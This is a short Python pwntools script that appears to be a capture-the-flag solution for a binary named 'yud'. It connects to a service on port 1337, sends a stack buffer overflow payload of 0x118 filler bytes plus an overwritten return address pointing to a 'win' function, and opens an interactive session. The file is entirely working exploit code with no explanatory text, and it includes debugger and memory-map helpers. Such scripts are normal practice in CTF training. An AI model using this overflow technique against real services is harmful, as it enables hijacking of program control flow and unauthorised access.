#!/usr/bin/python3
from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('yud', checksec=False)
base = None
def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')
def get_exe_base(pid):
    maps_file = f"/proc/{pid}/maps"
    exe_base = None

    with open(maps_file, 'r') as f:
        exe_base = int(f.readline().split('-')[0], 16)

    if exe_base is None:
        raise Exception("Executable base address not found.")
    
    return exe_base

def GDB(proc):
    gdb.attach(p, gdbscript=f'''
               b *0x40173B
               c
               ''')
def set_data(data, len):
    sla(b'>', b'1')
    sla(b'Length', str(len).encode())
    sa(b'Data', data)
def get_data():
    sla(b'>> ', b'2')

p = remote('0', 1337)
#p = process()
#base = get_exe_base(p.pid)
#GDB(p)
win = 0x401551
payload = b'A'*0x118 + p64(win + 5)
set_data(payload, 0x10000)
sla(b'>', b'3')
p.interactive()